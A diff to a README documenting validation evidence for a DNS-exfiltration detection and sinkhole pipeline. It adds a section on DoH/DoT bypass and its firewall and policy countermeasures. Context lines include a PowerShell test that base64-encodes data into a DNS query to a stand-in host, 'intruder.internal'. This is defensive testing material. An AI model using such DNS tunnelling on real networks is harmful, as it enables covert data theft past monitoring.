@@ -16,8 +16,6 @@ This directory contains end-to-end evidence validating the deployment, signal he
 * **Decision Threshold:** P(Exfil) >= 0.75
 * **Containment Target:** `127.0.0.1` (`local_zone redirect`)
 
----
-
 ## 2. Evidence Chain of Custody
 
 | Step | Source System | Evidence File / Artifact | Key Findings |
@@ -33,8 +31,6 @@ This directory contains end-to-end evidence validating the deployment, signal he
 | **09. Unbound Zone Table State** | Unbound Resolver | [unbound-table-inspection](./unbound-table-inspection.txt) | Executed `unbound-control list_local_data \| grep 127.0.0.1`; confirmed volatile redirect entry for target apex. |
 | **10. Client Containment Test** | `WRKSTN-01` | [client-resolution-verify](./client-resolution-verify.txt) | Resolved `test.intruder.internal` returning `127.0.0.1`, while benign internet lookups resolved cleanly. |
 | **11. Forensic Audit Trail** | Edge Filesystem | [sinkhole-audit](./sinkhole-audit.json) | Validated JSON forensic record committed to `/var/log/sinkhole_audit.log` with timestamp, client IP, heuristics, and model confidence. |
-
----
 
 ## 3. Deep-Dive Analysis: Pipeline Architecture & Arbitration Logic
 
@@ -133,7 +129,6 @@ $b64 = [Convert]::ToBase64String($bytes).Replace('+', 'A').Replace('/', 'B').Rep
 Resolve-DnsName -Name "$b64.intruder.internal" -Type TXT
 
 ```
----
 
 ## 5. Operational Considerations & System Recovery Runbook
 
@@ -204,3 +199,44 @@ pluginctl -s suricata restart
 tail -f /tmp/ramdisk/eve-dns.json
 
 ```
+
+## 6. Threat Model & Evasion Mitigation: Encrypted DNS (DoH / DoT)
+
+### The Encrypted Bypass Vector
+Because the Sieve ingests passive Layer 3/4 telemetry from Suricata, encrypted DNS payloads bypass inspection entirely:
+* **DNS over TLS (DoT - TCP 853):** TLS handshake obscures the QNAME and payload wireformat from packet disassembly.
+* **DNS over HTTPS (DoH - TCP 443):** DNS binary frames tunnel inside standard HTTPS sessions, blending directly with web egress.
+
+If an endpoint establishes direct encrypted DNS sessions to public resolvers (e.g., `1.1.1.1`, `8.8.8.8`), the Suricata EVE tap never produces a `dns` event type, bypassing the Sieve and Arbiter entirely.
+
+---
+
+### Perimeter & Endpoint Enforcement Matrix
+
+To enforce pipeline coverage across all internal traffic, the environment relies on a three-tier suppression strategy:
+
+| Vector | Enforcement Layer | Mechanism | Administrative Action |
+|---|---|---|---|
+| **DoT (TCP 853)** | OPNsense Firewall | L4 Egress Block | Floating rule: Reject outbound `TCP 853` from all internal subnets to WAN. |
+| **DoH (Canary)** | Unbound DNS | Canary Sinkhole | Local zone override returning `NXDOMAIN` for `use-application-dns.net` to disable browser auto-upgrade. |
+| **DoH (Public IP)** | OPNsense Firewall | L4 Alias Block | Firewall alias containing known public DoH IPs; drop outbound destination `443` to those addresses. |
+| **DoH (Endpoint)** | Active Directory | Group Policy (GPO) | Enforce `DnsOverHttpsMode = 0` across Chrome, Edge, and Windows 11 client adapters. |
+
+---
+
+### Upstream Transport Encryption
+Restricting client-side encrypted DNS does not preclude transport encryption on the WAN. Unbound can safely be configured with `forward-tls-upstream: yes` to encrypt outbound recursion to upstream root/recursive providers:
+
+```text
+[Client / AD DC] ──(Cleartext UDP 53)──► [OPNsense Gateway] ──(DoT TCP 853)──► [Upstream DNS]
+                                                │
+                                    ┌───────────┴───────────┐
+                                    │ Suricata EVE Tap      │
+                                    │ Sieve Entropy Gate    │
+                                    │ Arbiter / Sinkhole    │
+                                    └───────────────────────┘
+
+```
+
+Because the Suricata EVE tap intercepts traffic on the internal gateway interface prior to forwarding, upstream TLS encryption does not impact telemetry ingestion or containment execution.
+
